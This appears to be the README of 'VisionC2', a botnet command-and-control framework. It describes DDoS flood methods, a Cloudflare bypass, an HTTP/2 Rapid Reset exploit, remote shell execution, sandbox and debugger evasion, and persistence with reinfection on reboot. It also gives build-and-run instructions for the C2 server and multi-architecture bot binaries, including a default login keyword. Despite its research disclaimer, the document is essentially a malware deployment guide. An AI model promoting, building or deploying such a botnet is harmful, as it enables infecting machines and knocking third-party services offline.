
<div align="center">

# ☾℣☽ VisionC2

**An advanced command and control framework featuring DDOS, RCE, and SOCKS5 modules.**
**Multi-layer encryption, TLS 1.3 communication, and 14+ CPU architectures.**

![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge&logo=linux&logoColor=white)
![License](https://img.shields.io/badge/License-GNU%20GPL-blue?style=for-the-badge&logo=go)

[![Architecture](https://img.shields.io/badge/Full_Architecture-Documentation-blueviolet?style=for-the-badge)](Docs/ARCHITECTURE.md)
[![Changelog](https://img.shields.io/badge/Full_ChangeLog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)

![Animation](https://github.com/user-attachments/assets/270e68e1-a90f-4a71-ac64-1c4c0f4b3bec)

</div>

---

## Key Features

| | Feature | Description |
|---|---|---|
| 🤖 | **CNC** | Full-featured TUI control panel built with BubbleTea |
| 🔒 | **Communication** | Modern TLS 1.3 encrypted bot-to-server |
| ⚔️ | **Attack Methods** | Layer 4 (network) and Layer 7 (application) |
| 🕵️ | **Evasion** | HMAC/MD5 auth, process scanning, debugger detection |
| 👻 | **Stealth** | Unix daemonization + single-instance enforcement |
| ♻️ | **Persistence** | Auto cronjobs, startup scripts, reinfection on reboot |
| 📡 | **C2 Resilience** | TXT/A records + direct IP, runtime C2 decryption |
| 💻 | **Cross-Platform** | 14 multi-arch targets + custom UPX packer |
| ⚡ | **Auto-Setup** | Python script automates config + build |

---

## Attack Methods

<details>
<summary><b>Layer 4 — Network/Transport</b></summary>

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | SYN packets with randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol (47) packets with max payload |
| **DNS Flood** | Randomized DNS query types (A, AAAA, MX, NS, etc.) |

</details>

<details>
<summary><b>Layer 7 — Application</b></summary>

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487) with batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

</details>

---

## Installation

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install -y \
    upx-ucl openssl git wget gcc python3 screen build-essential

# Install Go (1.23+ required)
wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version  # verify installation
```

### Quick Setup

1. **Clone the repository**
   ```bash
   git clone https://github.com/Syn2Much/VisionC2.git
   cd VisionC2
   chmod +x *
   ```

2. **Run interactive setup**
   ```bash
   python3 setup.py
   ```
   The setup script will:
   - Generate 4096-bit TLS certificates
   - Create encryption keys and configuration
   - Cross-compile binaries for all supported architectures
   - Build the C2 server binary

3. **Output locations**

   | Output | Path |
   |---|---|
   | C2 Server | `./server` |
   | Agent Binaries | `./bins/` |
   | Configuration | `setup_config.txt` |

---

## Usage

### Starting the C2 Server

**Option 1: TUI Mode (Recommended)**
```bash
screen ./server
```
- Detach: `Ctrl + A` → `D`
- Reattach: `screen -r`

**Option 2: Telnet/Multi-User Mode**
```bash
screen ./server --split
nc your-server-ip 1337
```
- User database: `cnc/users.json`
- Default login keyword: `spamtec`

---

## Architecture

```text
Bot Binary
    │
    ▼
┌─────────────────────────────────────────┐
│         Startup Sequence                │
│  - Daemonization                        │
│  - Sandbox Detection                    │
│  - Persistence Installation             │
│  - Metadata Caching                     │
└─────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────┐
│      C2 Resolution & Connection         │
│  - DNS Chain (DoH → UDP → A → Raw)     │
│  - TLS 1.2+ Handshake                   │
│  - Authentication Challenge/Response    │
└─────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────┐
│        Command Loop & Execution         │
│  - Command Dispatch (blackEnergy)       │
│  - Attack Execution (14+ methods)       │
│  - SOCKS5 Proxy Server                  │
│  - Shell Command Execution              │
└─────────────────────────────────────────┘
```

---

## Documentation

| Document | Description |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history and changes |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`USAGE.md`](Docs/USAGE.md) | Usage guide |

---

## Legal Disclaimer

> **FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY**
>
> This software is intended for authorized penetration testing, security research and education, and legitimate stress testing of owned systems.
>
> **Usage of this tool for attacking targets without prior mutual consent is illegal. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.**

---

## Author

**Syn2Much** — [dev@sinnners.city](mailto:dev@sinnners.city) · [@synacket](https://x.com/synacket)

---

<div align="center">
<sub>Maintained with ❤️ by Syn</sub>
</div>
